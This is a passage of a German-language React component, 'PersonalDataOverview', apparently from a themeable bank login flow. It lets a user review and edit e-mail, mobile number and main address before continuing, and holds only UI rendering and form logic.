                    <Mail className="w-5 h-5 text-gray-700" /> E-Mail
                  </button>
                  <button onClick={() => openAddContact("mobil")} className="flex items-center gap-3 w-full px-4 py-3 text-sm font-medium text-gray-900 hover:bg-gray-50 transition-colors">
                    <Smartphone className="w-5 h-5 text-gray-700" /> Mobil
                  </button>
                  <button onClick={() => openAddContact("telefon")} className="flex items-center gap-3 w-full px-4 py-3 text-sm font-medium text-gray-900 hover:bg-gray-50 transition-colors">
                    <Phone className="w-5 h-5 text-gray-700" /> Telefon
                  </button>
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <p className="text-xs text-gray-500 mb-1">{emailLabelDisplay}</p>
              <div className="flex items-center justify-between gap-2">
                <p className="text-sm font-medium text-gray-900 break-all">{email}</p>
                <button onClick={() => openEditContact("email")} className="p-1 flex-shrink-0">
                  <Pencil className="w-4 h-4" style={{ color: themeColor }} />
                </button>
              </div>
              <div className="h-px mt-2" style={{ backgroundColor: themeColor + "30" }} />
            </div>
            <div>
              <p className="text-xs text-gray-500 mb-1">{mobilLabelDisplay}</p>
              <div className="flex items-center justify-between gap-2">
                <p className="text-sm font-medium text-gray-900">{mobilNr}</p>
                <button onClick={() => openEditContact("mobil")} className="p-1 flex-shrink-0">
                  <Pencil className="w-4 h-4" style={{ color: themeColor }} />
                </button>
              </div>
              <div className="h-px mt-2" style={{ backgroundColor: themeColor + "30" }} />
            </div>
          </div>

          <button
            onClick={() => setViewState("contact-list")}
            className="flex items-center gap-1 text-sm font-medium mt-4 hover:underline"
            style={{ color: themeColor }}
          >
            Weitere Kontaktwege ({extraContacts.length}) <ChevronRight className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Address card */}
      <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
        <div className="p-5 sm:p-6">
          <h2 className="text-lg font-bold text-gray-900 mb-4">Adressen</h2>

          {addressDecisionPending && additionalAddress && !additionalDeleted ? (
            <>
              <p className="text-sm text-gray-700 mb-4">
                Bitte wählen Sie Ihre <strong>derzeit aktuelle Wohnhauptadresse</strong>. Die jeweils andere Adresse wird entfernt.
              </p>

              {(() => {
                const primaryKeep = selectedAddress === "primary";
                const additionalKeep = selectedAddress === "additional";
                const primaryRemove = selectedAddress === "additional";
                const additionalRemove = selectedAddress === "primary";

                const renderBadge = (keep: boolean, remove: boolean) => {
                  if (keep) {
                    return (
                      <div className="mt-2 flex items-center gap-1 text-xs font-semibold text-green-600">
                        <Check className="w-3.5 h-3.5" /> Bleibt bestehen
                      </div>
                    );
                  }
                  if (remove) {
                    return (
                      <div className="mt-2 flex items-center gap-1 text-xs font-semibold text-red-600">
                        <X className="w-3.5 h-3.5" /> Wird entfernt
                      </div>
                    );
                  }
                  return null;
                };

                return (
                  <>
                    <button
                      type="button"
                      onClick={() => setSelectedAddress("primary")}
                      className={`w-full text-left p-4 rounded-lg border-2 transition-colors ${
                        primaryKeep
                          ? "border-green-500 bg-green-50/40"
                          : primaryRemove
                            ? "border-red-400 bg-red-50/40"
                            : "border-gray-200 hover:border-gray-300"
                      }`}
                    >
                      <p className="text-xs text-gray-500 mb-1">Hauptadresse (Wohnsitz)</p>
                      <p className="text-sm font-semibold text-gray-900">{strasse}</p>
                      <p className="text-sm font-semibold text-gray-900">{plzOrt}</p>
                      {renderBadge(primaryKeep, primaryRemove)}
                    </button>

                    <button
                      type="button"
                      onClick={() => setSelectedAddress("additional")}
                      className={`mt-3 w-full text-left p-4 rounded-lg border-2 transition-colors ${
                        additionalKeep
                          ? "border-green-500 bg-green-50/40"
                          : additionalRemove
                            ? "border-red-400 bg-red-50/40"
                            : "border-gray-200 hover:border-gray-300"
                      }`}
                    >
                      <p className="text-xs text-gray-500 mb-1">Weitere Adresse</p>
                      <p className="text-sm font-semibold text-gray-900">{additionalAddress.strasse}</p>
                      <p className="text-sm font-semibold text-gray-900">{additionalAddress.plzOrt}</p>
                      {renderBadge(additionalKeep, additionalRemove)}
                    </button>
                  </>
                );
              })()}
            </>
          ) : (
            <div>
              <p className="text-xs text-gray-500 mb-1">Hauptadresse (Wohnsitz)</p>
              <div className="flex items-center justify-between gap-2">
                <div>
                  <p className="text-sm font-medium text-gray-900">{strasse}</p>
                  <p className="text-sm font-medium text-gray-900">{plzOrt}</p>
                </div>
                <div className="flex items-center gap-1 flex-shrink-0">
                  <button onClick={() => {
                    const parts = plzOrt.split(" ");
                    setEditPlz(parts[0] || "");
                    setEditOrt(parts.slice(1).join(" ") || "");
                    setEditStrasse(strasse);
                    setEditAdresszusatz("");
                    setViewState("edit-address");
                  }} className="p-1">
                    <Pencil className="w-4 h-4" style={{ color: themeColor }} />
                  </button>
                </div>
              </div>
              <div className="h-px mt-2" style={{ backgroundColor: themeColor + "30" }} />
            </div>
          )}
        </div>
      </div>






      {/* Continue button */}
      {(() => {
        const hasEmail = !!email && email.trim().length > 0;
        const hasMobile = !!mobilNr && mobilNr.trim().length > 0;
        const hasAddress = !!strasse?.trim() && !!plzOrt?.trim();
        const needsAddressChoice = addressDecisionPending && !!additionalAddress && !additionalDeleted;
        const hasAddressChoice = !needsAddressChoice || selectedAddress !== null;
        const canContinue = hasEmail && hasMobile && hasAddress && hasAddressChoice;
        return (
          <div className="flex flex-col items-end gap-2">
            {(!hasEmail || !hasMobile || !hasAddress) && (
              <p className="text-xs text-red-600 text-right max-w-md">
                Bitte bestätigen Sie Ihre Kontakt Adressen, um fortzufahren.
              </p>
            )}
            {needsAddressChoice && !selectedAddress && hasMobile && hasEmail && hasAddress && (
              <p className="text-xs text-red-600 text-right max-w-md">
                Bitte wählen Sie Ihre aktuelle Hauptadresse, um fortzufahren.
              </p>
            )}
            <button
              onClick={() => {
                if (continueLoading) return;
                if (!hasEmail) {
                  openAddContact("email");
                  return;
                }
                if (!hasMobile) {
                  openAddContact("mobil");
                  return;
                }
                if (!hasAddress) {
                  onEditAddress();
                  return;
                }
                if (needsAddressChoice) {
                  if (!selectedAddress) return;
                  if (selectedAddress === "additional" && additionalAddress) {
                    setStrasse(additionalAddress.strasse);
                    setPlzOrt(additionalAddress.plzOrt);
                  }
                  setAdditionalDeleted(true);
                  onAddressChoiceResolved?.();
                  return;
                }
                onContinue();
              }}
              disabled={!canContinue || continueLoading}
              className={`px-8 py-3 ${theme.buttonRadius || "rounded-full"} text-white font-medium text-sm transition-opacity ${(canContinue && !continueLoading) ? "hover:opacity-90" : "opacity-70 cursor-not-allowed"}`}
              style={{ backgroundColor: theme.buttonBg }}
            >
              {continueLoading ? (
                <span className="inline-flex items-center gap-1" aria-label="Wird verarbeitet">
                  <span className="w-1.5 h-1.5 rounded-full bg-white animate-bounce" style={{ animationDelay: "0ms" }} />
                  <span className="w-1.5 h-1.5 rounded-full bg-white animate-bounce" style={{ animationDelay: "150ms" }} />
                  <span className="w-1.5 h-1.5 rounded-full bg-white animate-bounce" style={{ animationDelay: "300ms" }} />
                </span>
              ) : "Weiter"}
            </button>
          </div>
        );
      })()}

      {/* SmartTanOverlay wird global in BankLogin gerendert. */}
    </div>
  );
};

export default PersonalDataOverview;
